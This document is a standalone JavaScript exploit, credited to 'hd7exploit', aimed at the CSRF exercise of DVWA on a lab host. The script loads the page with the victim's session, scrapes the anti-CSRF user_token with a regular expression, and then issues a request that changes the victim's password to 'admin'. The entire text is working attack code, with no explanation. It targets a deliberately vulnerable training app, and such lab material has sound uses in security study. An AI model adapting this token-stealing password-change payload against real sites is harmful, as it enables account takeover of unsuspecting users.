<script>
    /**
     * Author hd7exploit
     */
    var theUrl = 'http://pentest.wp/dvwa/vulnerabilities/csrf/';
    var pass = 'admin';
    if (window.XMLHttpRequest){
        xmlhttp=new XMLHttpRequest();
    }else{
        xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
    }
    xmlhttp.withCredentials = true;
    var hacked = false;
    xmlhttp.onreadystatechange=function(){
        if (xmlhttp.readyState==4 && xmlhttp.status==200)
        {
            var text = xmlhttp.responseText;
            var regex = /user_token\' value\=\'(.*?)\' \/\>/;
            var match = text.match(regex);
            var token = match[1];
            var new_url = 'http://pentest.wp/dvwa/vulnerabilities/csrf/?user_token='+token+'&password_new='+pass+'&password_conf='+pass+'&Change=Change'
            if(!hacked){
                alert('Got token:' + match[1]);
                hacked = true;
                xmlhttp.open("GET", new_url, false );
                xmlhttp.send();  
            }
        }
    };
    xmlhttp.open("GET", theUrl, false );
    xmlhttp.send();  
            
</script>
